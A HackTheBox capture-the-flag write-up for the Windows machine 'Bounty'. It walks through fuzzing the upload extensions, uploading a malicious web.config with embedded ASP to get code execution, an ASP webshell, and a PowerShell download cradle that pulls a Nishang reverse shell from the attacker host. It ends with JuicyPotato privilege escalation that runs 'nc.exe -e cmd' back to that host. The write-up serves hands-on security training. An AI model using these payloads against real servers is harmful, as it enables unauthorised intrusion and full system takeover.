---
title: "Bounty"
date: 2023-09-06T15:27:13+02:00
tags: ["privesc","web","windows"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Windows machine with a website which we can upload crafted web.config files in order to get RCE. We privEsc exploiting SeImpersonatePrivilege with JuicyPotato.exe."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Bounty
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Bounty

![Untitled](/HTB/bounty-icon.png)

## Tools Used

- nmap
- burpsuite

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The scan shows only one port with a **http** server running.

## Enumeration

![Untitled](/HTB/bounty-1.png)

We only have a picture, I tried to find any hidden info with **strings** but there is nothing.

**exiftool** and **steghide** doesn’t find anything

So I started to **fuzz** the site with **gobuster**

```bash
gobuster dir -u http://10.10.10.93/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt,aspx -t 100 -o fuzz | tee fuzz.save
```

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 156] [--> http://10.10.10.93/aspnet_client/]
/transfer.aspx        (Status: 200) [Size: 941]
/uploadedfiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedfiles/]

===============================================================
Finished
===============================================================
```

We find three directories but `/aspnet_client` is useless.

![Untitled](/HTB/bounty-2.png)

`/transfer.aspx` directory seems a upload site.

![Untitled](/HTB/bounty-3.png)

`/uploadedfiles` doesn’t list nothing but maybe we can access to the files putting the file name.

When I tried to upload a **.txt** the site outputs the following error.

![Untitled](/HTB/bounty-4.png)

Maybe there is a server side extension whitelist so in order to know what extension we can upload we need to **fuzz**.

## Exploiting

Let’s fuzz extensions with **burpsuite** in order to bypass the upload filter.

First we need to know what is the exact server response so I intercepted the **request** and send it to the **repeater**, once done we can start crafting the **attack**.

![Untitled](/HTB/bounty-5.png)

Once done I send it to **intruder**, I selected the **sniper attack** mode and assign the **attack** positions to the file extension of the filename.

![Untitled](/HTB/bounty-6.png)

Now we need to go to the payloads tab and set the payload type as **simple list** and load a extension wordlist (in this case I used a SecLists wordlist). It’s important to uncheck the **url-encode** these characters option on the **Payload Encoding** options.

![Untitled](/HTB/bounty-7.png)

Now let’s move to the **Options** tab and set the message error in the **Grep - Extract** settings. (We can see the **response** because we get it at the **Repeater** part).

![Untitled](/HTB/bounty-8.png)

Now we are able to perform the attack, only rests to start it.

![Untitled](/HTB/bounty-9.png)

In the results one extension called my attention. The **.config** extension is used on IIS for **web.config** which is **an XML-based configuration file used to define an application's custom settings**, that file is similar as **.htaccess** on linux machines. If we are able to upload a modified **web.config** with a crafted payload we can then execute whatever we want.

I found a [blog](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/) where I found a crafted **web.config** with **ASP** code execution.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

With the **ASP** code above if all went great we are gonna see the result of 1+2 outputted.

![Untitled](/HTB/bounty-10.png)

The **ASP** code is executted. 

Let’s change the code to a asp simple **webshell**.

```xml
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Now the website has to show the output of **whoami**.

![Untitled](/HTB/bounty-11.png)

Well we are executing commands as **merlin**, what would happen if we put in a **reverse shell**.

```xml
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/PS.ps1')")
%>
```

The above code executes a **powershell** which runs PS.ps1 script which is a [Nishang](https://github.com/samratashok/nishang) **TCP shell.**

I changed the **Nishang** code putting `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4444` at the end in order to execute the script.

Now only rests to set a **nc** listener and access to **web.config**.

```powershell
nc -lv 4444
```

Nice we have a **shell**

## Gaining an Initial Foothold

![Untitled](/HTB/bounty-12.png)

![Untitled](/HTB/bounty-13.png)

We aren’t **NT AUTHORITY\SYSTEM** so we need to **privEsc**.

## Escalating Privilege

Let’s check the actual **privileges**.

```powershell
whoami /priv
```

```powershell
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

The `SeImpersonatePrivilege` allow us to use tools like [JuicyPotato](https://github.com/ohpe/juicy-potato) to **privEsc**.

First we need to see if our system works with **JuicyPotato**.

```powershell
systeminfo
```

```powershell
Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          9/6/2023, 2:05:35 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,594 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,600 MB
Virtual Memory: In Use:    495 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
```

The current version is vulnerable so I copied the binary with **smbserver.py** in order to execute it.

```powershell
smbserver.py smbFolder $(pwd) -smb2support
```

```powershell
copy \\10.10.14.9\smbFolder\JuicyPotato.exe .
```

Once copied I have executed it with the following arguments.

```powershell
.\JuicyPotato.exe -t * -p \Windows\System32\cmd.exe -l 1338 -a "/c \\10.10.14.9\smbFolder\nc.exe -e cmd 10.10.14.9 4445"
```

With a **smbserver** on the **nc.exe** binary and setting a **nc** listener on our local machine, we are able to do a reverse shell as root.

```powershell
nc -lv 4445
```

![Untitled](/HTB/bounty-14.png)

![Untitled](/HTB/bounty-15.png)

**Thank you for reading, and happy hacking! 😄**